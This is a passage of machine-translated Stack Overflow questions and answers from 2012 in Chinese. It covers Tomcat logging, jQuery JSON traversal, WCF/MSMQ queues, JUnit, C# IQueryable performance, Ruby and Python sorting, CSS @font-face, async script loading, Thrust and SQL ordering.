 2012 3:32:50 PM org.apache.catalina.core.StandardContext start
SEVERE: Context [/App] startup failed due to previous errors 
```

有任何想法吗 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T14:22:06.343

在 WAR 内的“/WEB-INF/classes”目录下添加一个“log4j.properties”文件，以帮助调试哪个侦听器抛出此错误。

这适用于 Tomcat 版本 < 6.0

在 Tomcat 6 或更高版本中，默认记录器是“java.util.logging”记录器，而不是 Log4J。因此，如果您尝试添加“log4j.properties”文件——这将不起作用。Java utils 记录器查找名为“logging.properties”的文件，如下所述：http: [//tomcat.apache.org/tomcat-6.0-doc/logging.html](http://tomcat.apache.org/tomcat-6.0-doc/logging.html)

因此，要了解调试详细信息，请在 WAR 的“/WEB-INF/classes”文件夹下创建一个“logging.properties”文件，一切就绪。

现在，当您重新启动 Tomcat 时，您将看到您的所有调试都充满了光彩！！！

示例 logging.properties 文件：

```
org.apache.catalina.core.ContainerBase.[Catalina].level = INFO
org.apache.catalina.core.ContainerBase.[Catalina].handlers = java.util.logging.ConsoleHandler 
```

您很可能会看到“ClassNotFound”异常。

# json - 使用 JQuery $.each 函数解析 Facebook Graph API JSON 消息的问题

> ID：12820929
> 
> 赞同：2
> 
> 时间：2012-10-10T13:48:33.753
> 
> 标签：json

我一直在尝试使用 Javascript JQuery $.each(function()) 函数访问/解析在 JSON 结果中找到的“消息”对象，该对象由 Facebook Graph API 发布，但没有成功。我可以访问“名称”对象，但不能访问 statuses=>data 数组中的对象。我尝试了多种语法，但没有成功。我想知道是否可以使用 Javascript JQuery $.each(function()) 函数提供一个语法示例，说明我如何访问“消息”对象。正如您将注意到的，“消息”对象位于以下结构下：results=>friends=>data array=>statuses=>data array=>message。

```
{
  "id": "idValue", 
  "friends": {
    "data": [
      {
        "name": "NameValue", 
        "id": "idValue", 
        "statuses": {
          "data": [
            {
              "message": "Msg1", 
              "updated_time": "Date", 
            }, 
            {
              "message": "Msg2", 
              "updated_time": "Date", 
            },
          ], 
        }
      }, 
      {
        "name": "NameValue", 
        "id": "idValue", 
        "statuses": {
          "data": [
            {
              "message": "Msg1", 
              "updated_time": "Date", 
                }, 
            {
              "message": "Msg2", 
              "updated_time": "Date", 
            },
          ], 
        }
      }
    ], 

  }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T14:18:20.857

假设该块存储在`response`：

```
console.log(response);
$.each(response.friends.data, function(i, friend){
   console.log(friend);
   $.each(friend.statuses, function(i, status){
       console.log(status);
   }); 
}); 
```

未经测试，但它应该工作。它有助于在过程中使用 console.log 来确定您正在查看的内容。在 Chrome 或 Firefox 中查看检查器中的日志

# wcf - 无法在工作组模式下使用 WCF 从远程事务私有队列中读取（可以使用 System.Messaging ！）

> ID：12820933
> 
> 赞同：4
> 
> 时间：2012-10-10T13:48:45.077
> 
> 标签：wcf, transactions, msmq

我花了几天时间阅读 MSDN、论坛和文章，但找不到解决问题的方法。

作为 PoC，我需要从多台机器上消费一个队列，因为我需要在消费者端进行容错。性能不是问题，因为每天应该交换少于 100 条消息。

我编写了两个简单的控制台应用程序，一个作为客户端，另一个作为服务器。使用 Framework 4.0（也在 3.5 上测试过）。消息正在使用事务。

一切都在单台机器（Windows 7）上运行良好，即使在运行多个消费者应用程序实例时也是如此。

现在我有一个 2012 和一个 2008 R2 虚拟测试服务器在同一个域中运行（但无论如何都不想使用 AD 集成）。我正在使用 IP 地址或“。” 在端点地址属性中防止 DNS/AD 解析副作用。

**如果队列由消费者托管并且生产者在远程私有队列上提交消息，则一切正常**。如果我交换 2012 和 2008 服务器的消费者/生产者角色，这也是如此。

**但是当消费者从远程队列读取并且生产者在本地提交消息时，我永远无法使用 WCF 运行此操作**。提交永远不会失败，我的问题是在消费者方面。

我希望使用 netMsmqBinding 来运行它，但我也尝试使用 msmqIntegrationBinding。对于每个测试，我调整了代码和配置，然后确认当消费者从本地队列消费时它运行正常。

我所做的最后一个测试是仅在生产者（本地队列）上使用 WCF（msmqIntegrationBinding），在消费者（远程队列）上使用 System.Messaging.MessageQueue：它工作正常！=> 我的目标是在两边都使用 WCF 和 netMsmqBinding。

在我看来，我已经证明这个问题是 WCF 问题，而不是 MSMQ 问题。这与安全、身份验证、防火墙、传输、协议、MSMQ 版本等无关。

使用 MS Service Trace Viewer 的错误信息：

接收消息时使用 msmqIntegrationBinding（打开队列正常）：*从队列接收消息时出错：无法导入指定的事务。(-1072824242, 0xc00e004e)。确保 MSMQ 已安装并正在运行。确保队列可用于接收。*

使用 netMsmqBinding，在打开队列*时：将“172.22.1.9\private$\Test”队列路径名转换为格式名时出错：指定的队列路径名无效。(-1072824300, 0xc00e0014)。排队通道上的所有操作均失败。确保队列地址有效。MSMQ 必须在启用 Active Directory 集成的情况下安装并且可以访问它。*

如果有人可以帮助找出为什么我的配置无法由 WCF 处理，这是一种比 Messaging 更优雅且可配置的方式，我将不胜感激！

```
 Thank you. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-05-19T03:21:12.953

您可能需要发布您的消费者代码和配置以提供更多想法，但它可能是队列名称的构造 - 例如

> 格式名称：DIRECT=TCP:192.168.0.2\SomeQueue

有几种不同的方法可以连接到队列，并且当您在远程或本地时它也会发生变化。

我过去发现这篇文章可以提供帮助：

[http://blogs.msdn.com/b/johnbreakwell/archive/2009/02/26/difference-between-path-name-and-format-name-when-accessing-msmq-queues.aspx](http://blogs.msdn.com/b/johnbreakwell/archive/2009/02/26/difference-between-path-name-and-format-name-when-accessing-msmq-queues.aspx)

此外，MSDN 上的 MessageQueue 构造函数... [http://msdn.microsoft.com/en-us/library/ch1d814t.aspx](http://msdn.microsoft.com/en-us/library/ch1d814t.aspx)

# java - 如何使所有单元测试失败

> ID：12820935
> 
> 赞同：3
> 
> 时间：2012-10-10T13:48:51.660
> 
> 标签：java, unit-testing

我想找到永远不会失败的单元测试（用 JUnit 编写）。即测试有类似的东西

```
try {
// call some methods, but no assertions
} catch(Throwable e) {
// do nothing
} 
```

那些测试基本上是没用的，因为它们永远不会在代码中发现问题。那么有没有办法让每个（有效的）单元测试失败？例如，每次调用任何断言方法都会引发异常？然后仍然保持绿色的测试是无用的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:50:26.650

如果您试图使对*每种方法的**每次*调用都失败，那么我不确定如何为您提供帮助。@JonSkeet 对 Jester 的建议可能与您想要的很接近。 *`Assert`*

 *但是，如果您试图找到*一种* `Assert`总是失败的方法，那[`Assert.fail`](http://junit.sourceforge.net/javadoc/org/junit/Assert.html#fail%28java.lang.String%29)就是您想要的。它引发了一个`AssertionError`调用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:51:12.887

好吧，一种方法是使用[Jester](http://jester.sourceforge.net/)之类的东西来实现[突变测试](http://en.wikipedia.org/wiki/Mutation_testing)。它并没有按照您建议的方式做事，但它会尝试找到仍然可以通过的测试，无论您更改生产代码多少，但会随机改变它并重新运行测试。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-10T14:09:05.927

我假设您想要跟踪吞下断言和/或不做出任何断言的代码。最简单的方法是构建您自己的 JUnit JAR，用`Assert`您自己的类替换原始类。

这不会帮助您找到断言是虚假的情况，并且如果您处于开发人员不费心断言的环境中，那么您也可能会遇到虚假断言。它也不能帮助您找到标有 的测试`@Ignore`，但*grep*会为您完成。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-10T13:50:48.493

将此添加为您的默认测试实现：

```
Assert.assertTrue(false); 
```

以这种方式开始的每个测试都会失败，直到您用合适的东西替换该行。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-10T13:51:22.637

我不确定你想要什么，但我知道单位已经写好了，所以我能想象的唯一方法是重写断言方法，但即使这样你也必须稍微改变一下单位代码。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-10T13:57:26.577

使用以下配置对您的 JUnit 源运行[CheckStyle ：](http://checkstyle.sourceforge.net)

```
<module name="IllegalCatch">
    <property name="illegalClassNames" value="java.lang.Throwable, java.lang.Error, java.lang.AssertionError"/>
</module> 
```*

# c# - 使用 IQueryable 时优化对数据库的访问次数 和自定义函数

> ID：12820939
> 
> 赞同：1
> 
> 时间：2012-10-10T13:49:09.007
> 
> 标签：c#, repository, iqueryable

在我的**C# 类库项目**中，我有一个需要计算一些统计数据的方法`GetFaultRate`，给定 a `date`，计算有故障的产品数量超过生产的产品数量。

```
float GetFaultRate(DateTime date)
{
    var products = GetProducts(date);
    var faultyProducts = GetFaultyProducts(date);

    var rate = (float) (faultyProducts.Count() / products.Count());

    return rate;
} 
```

两种方法，`GetProducts`并`GetFaultyProducts`从**Repository**类中获取数据`_productRepository`。

```
IEnumerable<Product> GetProducts(DateTime date)
{
    var products = _productRepository.GetAll().ToList();

    var periodProducts = products.Where(p => CustomFunction(p.productionDate) == date);

    return periodProducts;
}

IEnumerable<Product> GetFaultyProducts(DateTime date)
{
    var products = _productRepository.GetAll().ToList();

    var periodFaultyProducts = products.Where(p => CustomFunction(p.ProductionDate) == date && p.Faulty == true);

    return periodFaultyProducts;
} 
```

哪里`GetAll`有签名：

```
IQueryable<Product> GetAll(); 
```

数据库中的产品很多，检索和转换需要很长时间`ToList()`。我需要枚举该集合，因为任何自定义函数（例如`CustomFunction`、 ）都无法在`IQueryable<T>`.

我的应用程序在获得故障率之前卡了很长时间。我想这是因为要检索的对象数量很大。我确实可以删除这两个函数`GetProducts`并`GetFaultyProducts`实现里面的逻辑`GetFaultRate`。但是，由于我还有其他使用`GetProducts`and的函数，因此使用`GetFaultyProducts`后一种解决方案，我只能访问数据库，但有很多重复的代码。

什么是好的妥协？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T14:08:42.153

首先，不要将其转换`IQueryable`为列表。它强制将整个数据集一次全部放入内存，而不是直接调用`Where`查询，这将允许您在数据进入时对其进行过滤。这将*大大*减少您的内存占用，并且（非常）略微增加运行速度。如果您需要将 an 转换`IQueryable`为 an`IEnumerable`以便`Where`数据库不执行，只需使用`AsEnumerable`.

接下来，尽可能避免获取*所有*数据，尤其是多次。您需要向我们展示您的日期函数的作用，但它可能是可以在数据库上完成的。您可以在数据库中执行的任何过滤都将*大大*提高性能。

接下来，您在这里真的不需要两个查询。第二个查询只是第一个查询的子集，所以如果您*知道*您将始终使用两个查询，那么您应该只执行第一个查询，将结果放入内存（即使用`ToList`您存储的 a）然后使用a`Where`以进一步过滤结果。这将避免另一个数据库旅行以及所有数据处理/过滤。

如果您并不总是同时使用这两个查询，但有时只使用其中一个，那么您可以通过`Faulty`在获取所有项目之前过滤掉来改进第二个查询。在调用`Where(p => p.Faulty)` *之前*添加并在调用*之后*`AsEnumerable`过滤日期信息（如果您无法将任何日期过滤转换为可以在数据库中完成的过滤）。*`AsEnumerable`*

 *看来，最终您只需要计算有缺陷的项目与总数相比的比率。这可以通过一个查询轻松完成，而不是两个。

您已经说过`Count`在您的代码中运行非常缓慢，但这不是真的。 `Count`只是实际枚举查询的方法，而所有其他方法只是构建查询，而不是执行它。但是，您可以通过完全组合查询来大幅降低性能成本。

```
var lookup = _productRepository.GetAll()
.AsEnumerable()//if at all possible, try to re-write the `Where` 
               //to be a valid SQL query so that you don't need this call here
.Where(p => CustomFunction(p.productionDate) == date)
.ToLookup(product => product.Faulty);

int totalCount = lookup[true].Count() + lookup[false].Count();
double rate = lookup[true].Count() / (double) totalCount; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T14:10:17.240

```
var products = GetProducts(date);
var periodFaultyProducts = (from p in products.AsParallel()
                            where p.Faulty == true
                            select p).AsEnumerable(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T16:03:00.270

您需要减少数据库请求的数量。`ToList`, `First`, `FirstOrDefault`, `Any`,`Take`并`Count`强制您的查询在数据库中运行。正如 Servy 指出的那样，`AsEnumerable`将您的查询从 转换`IQueryable`为`IEnumerable`. 如果您必须找到子集，您可以使用`Where`.*

# ruby - Ruby哈希上的多字符串元素排序，第一个键降序，第二个键升序

> ID：12820941
> 
> 赞同：2
> 
> 时间：2012-10-10T13:49:12.373
> 
> 标签：ruby, string, sorting, hash, multikey

给定以下哈希数组：

```
values = [
  {"one"=>"BA", "two"=>"AAB"},
  {"one"=>"AA", "two"=>"BBA"},
  {"one"=>"AA", "two"=>"BCB"},
  {"one"=>"AA", "two"=>"ABA"},
  {"one"=>"BC", "two"=>"AAC"},
  {"one"=>"AC", "two"=>"AAB"},
  {"one"=>"AC", "two"=>"AAA"},
  {"one"=>"AB", "two"=>"BCC"}
] 
```

如何获得以下输出：

```
 {"one"=>"BC", "two"=>"AAC"}
  {"one"=>"BA", "two"=>"AAB"}
  {"one"=>"AC", "two"=>"AAA"}
  {"one"=>"AC", "two"=>"AAB"}
  {"one"=>"AB", "two"=>"BCC"}
  {"one"=>"AA", "two"=>"ABA"}
  {"one"=>"AA", "two"=>"BBA"}
  {"one"=>"AA", "two"=>"BCB"} 
```

如果两个键值都指向整数，我可以很容易地做到这一点：

```
multi_sort = values.sort_by { |x| [-x["one"], x["two"] ] } 
```

使用字符串值执行此操作的语法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T14:35:02.220

您可能需要编写一个完整的`sort`方法：

```
values.sort { |a,b| a["one"] == b["one"] ? a["two"] <=> b["two"] : b["one"] <=> a["one"] } 
```

请注意，比较的顺序是“一”和“二”的`b`对比。`a``a``b`

如果您使用符号键而不是字符串，这可能会更简洁。

# css - Firefox 忽略由 FontSquirrel 生成的 @font-face

> ID：12820945
> 
> 赞同：1
> 
> 时间：2012-10-10T13:49:27.480
> 
> 标签：css, firefox, font-face

我用 FontSquirrel 生成了一个@font-face，并产生了这些（稍后调整）规则：

```
@font-face {
    font-family: 'CabinSketchRoBold';
    src: url('cabinsketchro-boldwebfont.eot');
}

@font-face {
    font-family: 'CabinSketchRoBold';
    src: url('cabinsketchro-boldwebfont.woff') format('woff'),
         local('?'), url('cabinsketchro-boldwebfont.ttf') format('truetype'),
         url('cabinsketchro-boldwebfont.svg#CabinSketchRoBold') format('svg');
    font-weight: normal;
    font-style: normal;
} 
```

样式在 css 文件中应用如下：

```
h1,h2,h3,h4,h5,h6 {font-weight:normal;font-family:'CabinSketchRoBold',Arial,sans-serif !important; } 
```

在 Chrome 中一切正常，即使在 InternetExplorer 中，但在**较新**版本的 Firefox 中，字体不会加载。它在 FF 3.6 中加载... o_O

我有另一种字体，Ubuntu，通过 JavaScript 选项从谷歌加载，并且在更改后加载正常，即使在标题上

```
font-family:'CabinSketchRoBold','Ubuntu',Arial,sans-serif !important; 
```

使 FF 忽略我的本地字体的声明有什么问题？

编辑：这不仅在本地主机上，它也发生在实时站点上。我查看了其他答案并尝试了它们，但没有运气。WOFF 甚至是 base64 编码，结果相同。

**已解决：似乎 .eot 在单独的声明中（同样，FontSquirrel 生成）正在造成损害。与其他人一起移动它解决了它。谢谢鲍里斯·兹巴尔斯基！**

```
@font-face {
    font-family: 'CabinSketchRoBold';
    src: url('cabinsketchro-boldwebfont.eot?#') format('eot'),
         url('cabinsketchro-boldwebfont.woff') format('woff'),
         local('?'), url('cabinsketchro-boldwebfont.ttf') format('truetype'),
         url('cabinsketchro-boldwebfont.svg#CabinSketchRoBold') format('svg');
    font-weight: normal;
    font-style: normal;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T08:00:32.287

您的问题是您实际上是在定义“CabinSketchRoBold”字体的两个单独的面。

第一个面是正常粗细，并使用 .eot 文件作为字体数据。

第二张脸是粗体，使用 woff、truetype、svg 中的一种，以可用者为准。

然后，您正在为正常重量的文本设置样式。所以第一个面被选中。有关此规范，请参阅[http://dev.w3.org/csswg/css3-fonts/#font-style-matching 。](http://dev.w3.org/csswg/css3-fonts/#font-style-matching)

特别是，按照该规范中的步骤，在第 4 步中，我们最终得到了一个面：.eot 面。但由于浏览器无法使用该字体格式执行任何操作，因此该面孔没有字形，因此在第 5 步中，浏览器会转到下一个姓氏。根据规范，不考虑“CabinSketchRoBold”系列中的另一个（粗体）面。

所以结果是你应该要么`font-weight: bold`在你的规则中列出，要么在任何一个都不列出。然后 .eot 和其他选项都将被视为单一字体的来源，而不是同一家族中的不同面孔。

不幸的是，看起来 Chrome 并没有真正遵循这里的规范……

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-11T09:39:44.133

最新版本的 Firefox 能够在 tools->web developer->errors 控制台中显示与字体相关的错误。例如，这是我使用自定义字体给出​​的错误：

```
Error: downloadable font: table 'GSUB': OpenType layout data discarded 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-10T13:58:21.420

您必须具有此字体类型才能在 IE、Firefox、Chrome 中工作

```
 @font-face
{
    font-family: 'BHoma';
    src: url('/public/font/BHoma.eot?#')format('eot'), 
    url('/public/font/BHoma.ttf')format('truetype'),
    url('/public/font/BHoma.woff')format('woff'), 
    url('/public/font/BHoma.svg#BHoma')format('svg');
} 
```

但您首先必须从此链接生成字体

[http://www.codeandmore.com/2011/06/font-face-kit-generator/](http://www.codeandmore.com/2011/06/font-face-kit-generator/)

# javascript - 用li缓慢追加，使用ajax调用的for循环使其变慢？

> ID：12820947
> 
> 赞同：0
> 
> 时间：2012-10-10T13:49:32.220
> 
> 标签：javascript, jquery

For循环与ajax调用之后，慢for循环？

```
 for (var x = this.from; x < this.emax; x++) { this.list.append('<li></li>'); }

  jQuery.ajax({
  ..... 
```

不知何故，它将在 for 循环的同时启动 ajax 请求。所以 Chrome 有点窒息。我不想这样，可以修吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:58:35.037

从我所见，浏览器通常不会更新页面，直到脚本完成处理当前事件。这意味着 Ajax 请求将在新的 LI 实际呈现之前启动，并且两者*似乎*几乎同时发生。

一种解决方法是将`.ajax`调用放在`setTimeout`具有最小超时值的 a 中。0 毫秒的超时可能会这样做；如果没有，那么 1 会。关键是让调用排队，以便在它发生之前应用 DOM 更改。

（话虽如此，你为什么要先附加一堆空的 LI？如果它们是 Ajax 请求得到的任何内容的占位符，你可以考虑让它的成功回调添加它们。只是一个想法。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T14:01:23.043

可能这是工作我不确定：

```
for (var x = this.from; x < this.emax; x++) { this.list.append('<li>
</li>').slow(200,function() {
     jQuery.ajax({

      .........
}); } 
```

# cuda - 推力::device_ptr 没有成员“开始”

> ID：12820951
> 
> 赞同：2
> 
> 时间：2012-10-10T13:50:06.960
> 
> 标签：cuda, thrust

我试图找到数组中的最小元素：

```
 thrust::device_ptr<float> devPtr(d_ary);
 int minPos = thrust::min_element(devPtr.begin(), devPtr.end()) - devPtr.begin(); 
```

编译时出现上述错误。

我应该如何解决这个问题？谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T14:28:19.217

您确定的具体错误是因为设备指针不是容器，因此没有`.begin()`or`.end()`成员。your`devPtr`不是容器，它是 Thrust 可以使用的设备指针。您包装了一个原始指针来创建 devPtr，而原始指针不知道它所指向的数据区域的大小。

指针没有像 begin 和 end 这样的成员。

您可以通过以下方式解决问题：

1.  切换到使用推力向量容器，该容器将为您定义 .begin 和 .end 迭代器
2.  为您正在访问的数据区域 (d_ary) 手动创建开始和结束指针

下面是一些示例代码，类似于上面的后一个想法：

```
#include <thrust/device_ptr.h>
#include <thrust/extrema.h>

#define N 256
int main()
{

  float *d_a;

  cudaMalloc((void **) &d_a, N*sizeof(float));

  thrust::device_ptr<float> dPbeg(d_a);
  thrust::device_ptr<float> dPend = dPbeg + N;
  thrust::device_ptr<float> result = thrust::min_element(dPbeg, dPend);
} 
```

有一个可能感兴趣的[推力快速入门指南。](https://github.com/thrust/thrust/wiki/Quick-Start-Guide)（为了清楚起见，我没有用任何错误检查包装 cudaMalloc 调用。用错误检查包装 cuda 调用是一种很好的做法。）

# javascript - 异步脚本加载回调

> ID：12820953
> 
> 赞同：31
> 
> 时间：2012-10-10T13:50:14.470
> 
> 标签：javascript, function, asynchronous, callback

> [http://jsfiddle.net/JamesKyle/HQDu6/](http://jsfiddle.net/JamesKyle/HQDu6/)

我创建了一个基于[Google Analytics 异步脚本的 Mathias Bynens 优化的](http://mathiasbynens.be/notes/async-analytics-snippet)简短函数，如下所示：

```
function async(src) {
  var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
  o.src = '//' + src;
  s.parentNode.insertBefore(o, s);
} 
```

这很好用，我已经开始将它用于几个不同的脚本

```
// Crazy Egg
async('dnn506yrbagrg.cloudfront.net/pages/scripts/XXXXX/XXXXX.js?' + Math.floor(new Date().getTime() / 3600000));

// User Voice
var uvOptions = {};
async('widget.uservoice.com/XXXXX.js');

// Google Analytics
var _gaq = [['_setAccount', 'UA-XXXXX-XX'], ['_setDomainName', 'coachup.com'], ['_trackPageview']];
async('google-analytics.com/ga.js');

// Stripe
async('js.stripe.com/v1');​ 
```

当我遇到加载后需要调用的脚本时，问题就来了：

```
// Snap Engage
async('snapabug.appspot.com/snapabug.js');
SnapABug.init('XXXXX-XXXXX-XXXXX-XXXXX-XXXXX'); 
```

所以我想我会把它变成一个回调函数，这样可以使用：

```
async('snapabug.appspot.com/snapabug.js', function() {
    SnapABug.init('XXXXX-XXXXX-XXXXX-XXXXX-XXXXX');
}); 
```

我没想到这对我来说很难，但事实证明是这样的。

### 我的问题是在不使代码过于复杂的情况下添加回调的最有效方法是什么。

> 请参阅 jsfiddle：http: [//jsfiddle.net/JamesKyle/HQDu6/](http://jsfiddle.net/JamesKyle/HQDu6/)

* * *

## 回答 #1

> 赞同：57
> 
> 时间：2012-10-10T14:17:02.783

感谢[RASG](https://stackoverflow.com/users/982924/rasg)提供[https://stackoverflow.com/a/3211647/982924](https://stackoverflow.com/a/3211647/982924)

### 带回调的异步函数：

```
function async(u, c) {
  var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
  o.src = '//' + u;
  if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
  s.parentNode.insertBefore(o, s);
} 
```

用法：

```
async('snapabug.appspot.com/snapabug.js', function() {
    SnapABug.init('XXXXX-XXXXX-XXXXX-XXXXX-XXXXX');
}); 
```

> [jsFiddle](http://jsfiddle.net/JamesKyle/wvBKq/)

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2016-05-11T08:50:39.687

更新的片段：

```
async function loadAsync(src) {
    const script = document.createElement('script');
    script.src = src;
    return new Promise((resolve, reject) => {
        script.onreadystatechange = function () {
            if (script.readyState === 'loaded' || script.readyState === 'complete') {
                script.onreadystatechange = null;
                resolve(true);
            }
        };
        document.getElementsByTagName('head')[0].appendChild(script);
    });
} 
```

利用率

```
 loadAsync(`https://....js`).then(_ => {
    //  ... script loaded here
  }) 
```

* * *

[詹姆斯凯尔的回答](https://stackoverflow.com/a/12821561/247696)没有考虑到 IE9。[这是我在评论中提出的链接中](http://www.aaronpeters.nl/blog/prevent-double-callback-execution-in-IE9)找到的代码的修改版本。修改 var baseUrl 以便它可以相应地找到脚本。

```
//for requiring a script loaded asynchronously.
function loadAsync(src, callback, relative){
    var baseUrl = "/resources/script/";
    var script = document.createElement('script');
    if(relative === true){
        script.src = baseUrl + src;  
    }else{
        script.src = src; 
    }

    if(callback !== null){
        if (script.readyState) { // IE, incl. IE9
            script.onreadystatechange = function() {
                if (script.readyState === "loaded" || script.readyState === "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() { // Other browsers
                callback();
            };
        }
    }
    document.getElementsByTagName('head')[0].appendChild(script);
} 
```

用途：

```
loadAsync('https://www.gstatic.com/charts/loader.js' , function(){
    chart.loadCharts();
    });
// OR relative path
loadAsync('fastclick.js', null, true); 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2019-04-13T21:40:44.003

其他答案效果很好，但不是超级可读或需要承诺。这是我的两分钱：

```
function loadScript(src, callback) {
    var script = document.createElement('script');
    script.setAttribute('src', src);
    script.addEventListener('load', callback);
    document.head.appendChild(script);
}, 
```

# sorting - ActionScript：以编程方式对数据网格进行排序并从特定单元格获取数据

> ID：12820956
> 
> 赞同：0
> 
> 时间：2012-10-10T13:50:23.250
> 
> 标签：sorting, actionscript, datagrid, arraycollection

我的代码中有一个数据网格，如下所示：

```
<s:DataGrid id="dg">
  <s:ArrayCollection id="ac">
    <s:DataItem ../>
    <s:DataItem ../>
  </s:ArrayCollection>
</s:DatGrid> 
```

在以特定方式对数据进行排序后，我试图让一个单独的标签（默认情况下）显示来自特定单元格的数据。

例如：

```
DataGrid shows:

Date  Type
----  ----
8     yes      
12    no
6     this
7     that

Label: 6 (First date after sorting in ascending order) 
```

我可以在 ActionScript（或其他方式）中执行此操作的任何简单方法吗？我应该尝试使用 ArrayCollection 组件还是 DataGrid？

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-16T16:06:34.480

想通了，使用[排序 ArrayCollection](https://stackoverflow.com/questions/1602385/sorting-an-arraycollection-in-flex)参考。使用了两种不同的排序和提取方法：

排序：

```
private function sortFunction(a:Object, b:Object, array:Array = null):int
{
  ..my sorting code..
}

public function Grid_onLoad(event:Event):void
{
  var sort:Sort = new Sort();
  sort.compareFunction = sortFunction;
  items.sort = sort;
  items.refresh();
} 
```

萃取：

```
public function FirstDate():String
{
  return items.getItemAt(0).Date;
} 
```

然后它只是适当地调用函数的问题：

```
<s:DataGrid id="items" initialize="Grid_onLoad(event)">
  <s:ArrayCollection id="ac">
    <s:DataItem ../>
    <s:DataItem ../>
  </s:ArrayCollection>
</s:DatGrid>

<s:Label text="{FirstDate()}"/> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T17:31:39.287

我会研究 ArrayCollection 的排序功能： [Sorting ArrayCollection](https://stackoverflow.com/questions/1602385/sorting-an-arraycollection-in-flex "排序 ArrayCollection")

# sql - sql查询对数据进行排序

> ID：12820958
> 
> 赞同：0
> 
> 时间：2012-10-10T13:50:28.260
> 
> 标签：sql, oracle

我想以一个顺序为表的列中的数据排序，即我有一个表人的年龄

```
age
12
14
13
14
45
12
45
23
12
23
12 
```

我想将所有相似的年龄一个接一个地分组。如何做到这一点？我尝试使用 group by select age from person group by age.这对我不起作用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T13:52:07.527

```
SELECT age FROM Person ORDER BY age 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:53:19.600

尝试这个：

```
SELECT * FROM Person ORDER BY age 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T14:26:27.377

我以为你想加入表格，为了做到这一点，你有以下选择：

1) 具有不同/唯一的简单连接

```
select distinct person.name, age.age 
from person, age 
Where Person.Age = Age.Age 
order by age.age 
```

结果：

```
person_5    12
person_3    14
person_1    23
person_4    23
person_2    45 
```

2）右外连接

```
Select Distinct Person.Name, Age.Age 
from person right outer join age 
on Person.Age = Age.Age 
order by age.age 
```

结果：

```
person_5    12
    null    13
person_3    14
person_1    23
person_4    23
person_2    45 
```

3) 左外连接

```
Select Distinct Person.Name, Age.Age 
from person left outer join age 
On Person.Age = Age.Age 
order by age.age 
```

结果：

```
person_5    12
person_3    14
person_1    23
person_4    23
person_2    45 
```

* * *

源表：人员表（人员和年龄列）：

```
person_1    23
person_2    45
person_3    14
person_4    23
person_5    12 
```

年龄表（仅限年龄列）：

```
12
14
13
14
45
12
45
23
12
23
12 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-10T13:53:17.767

在`MySQL`中，您可以在`GROUP BY`不聚合列的情况下使用，但在中`oracle`则不能。尝试使用`DISTINCT`它，它只会选择唯一值。

```
SELECT DISTINCT age
FROM Person
Order by age ASC 
```

# python - 按格式化为字符串的键对python字典进行排序

> ID：12820960
> 
> 赞同：2
> 
> 时间：2012-10-10T13:50:32.487
> 
> 标签：python, sorting, dictionary

我有一个字典，其中字符串作为键，格式为 yyyy-mm-dd，并希望按最早日期的键对字典进行排序：

我目前正在使用`sorted(datesAndText.keys())`，但这并不可靠，因为月份和日期字段并不总是填充零。

我查看了[按日期键对 python 字典进行排序](https://stackoverflow.com/questions/11908686/sort-python-dictionary-by-date-keys)以及[如何在 Python 中对这个列表进行排序，如果我的日期在字符串中？](https://stackoverflow.com/questions/2589479/how-do-i-sort-this-list-in-python-if-my-date-is-in-a-string)但我似乎无法根据具体情况采用它们。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-10T13:56:43.487

您确定您的密钥完全符合格式`yyyy-mm-dd`吗？例如：

```
>>> '2010-1-15' < '2010-02-15'
False 
```

您可能会被迫对以下内容进行排序：

```
sorted(d,key=lambda x: [int(y) for y in x.split('-')]) 
```

另一种解决方案（假设您的年份都是 4 位数）：

```
sorted(d,key=lambda x: [y.zfill(2) for y in x.split('-')]) 
```

我不确定哪个会更快。我想这是一个候选人`timeit`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-10T13:53:18.823

格式中的日期`yyyy-mm-dd`按字母顺序和时间顺序排序相同，因此您可以使用标准`sorted`：

```
for k, v in sorted(datesAndText.items()):
    # do something with key and value 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-10T14:00:30.447

您的格式 ,`yyyy-mm-dd`允许字典排序，因此您的代码应该可以正常工作，除非您的值不是零填充（例如`2012-10-9`而不是`2012-10-09`）。

通过比较日期而不是字符串来解决这个问题：

```
sorted(datesAndText, key=lambda x: datetime.strptime(x, '%Y-%m-%d')) 
```

这利用了`key`sorted 参数，该参数是一个函数，它接受一个参数（在排序期间比较的列表元素）并返回一个`sorted`可用于排序的值。

